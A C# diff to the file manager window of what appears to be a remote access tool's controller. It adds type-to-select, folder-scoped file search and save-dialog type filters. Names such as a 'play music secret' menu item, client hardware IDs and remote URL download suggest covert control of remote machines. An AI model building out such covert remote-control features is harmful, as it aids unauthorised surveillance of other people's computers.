@@ -35,6 +35,7 @@ public partial class FileManagerWindow : ThemedWindow
     {
         InitializeComponent();
         RubberBandSelector.Enable(GridFiles);
+        TypeToSelect.Enable(GridFiles, o => (o as FileEntryVM)?.Name ?? "");
         _server     = server;
         _clientId   = clientId;
         _hwid       = server.ConnectedClients.TryGetValue(clientId, out var cc) ? cc.Hwid : string.Empty;
@@ -149,6 +150,7 @@ public partial class FileManagerWindow : ThemedWindow
         if (MnuFmPlayMusicSecret != null) MnuFmPlayMusicSecret.Header = Lang.Get(_isPlayingAudio ? "FM_STOP_AUDIO" : "FM_PLAY_MUSIC_SECRET");
         if (MnuFmZip             != null) MnuFmZip.Header             = Lang.Get("FM_ZIP");
         if (MnuFmDownloadUrl != null) MnuFmDownloadUrl.Header = Lang.Get("FM_DOWNLOAD_URL");
+        if (MnuFmFileSearch  != null) MnuFmFileSearch.Header  = Lang.Get("FM_FILE_SEARCH_HERE");
         if (MnuFmCopyName    != null) MnuFmCopyName.Header    = Lang.Get("ACT_COPY_NAME");
         if (MnuFmCopyPath    != null) MnuFmCopyPath.Header    = Lang.Get("ACT_COPY_PATH");
     }
@@ -199,8 +201,12 @@ public partial class FileManagerWindow : ThemedWindow
 
     private void FileSearchCtx_Click(object sender, System.Windows.RoutedEventArgs e)
     {
+        var sel = GridFiles.SelectedItem as FileEntryVM;
+        var root = sel?.IsDir == true
+            ? System.IO.Path.Combine(_currentPath, sel.Name)
+            : _currentPath;
         var win = new FileSearchWindow(_server, _clientId, TxtTitle.Text);
-        win.SetRootPath(_currentPath);
+        win.SetRootPath(root);
         win.Show();
     }
 
@@ -266,7 +272,11 @@ public partial class FileManagerWindow : ThemedWindow
     {
         if (GridFiles.SelectedItem is not FileEntryVM row || row.IsDir) return;
         if (_pendingData != null) return;
-        var dlg = new Microsoft.Win32.SaveFileDialog { FileName = row.Name };
+        var ext = System.IO.Path.GetExtension(row.Name);
+        var filter = string.IsNullOrEmpty(ext)
+            ? "All files (*.*)|*.*"
+            : $"{ext.TrimStart('.').ToUpper()} files (*{ext})|*{ext}|All files (*.*)|*.*";
+        var dlg = new Microsoft.Win32.SaveFileDialog { FileName = row.Name, Filter = filter };
         if (dlg.ShowDialog() != true) return;
 
         var sw = System.Diagnostics.Stopwatch.StartNew();
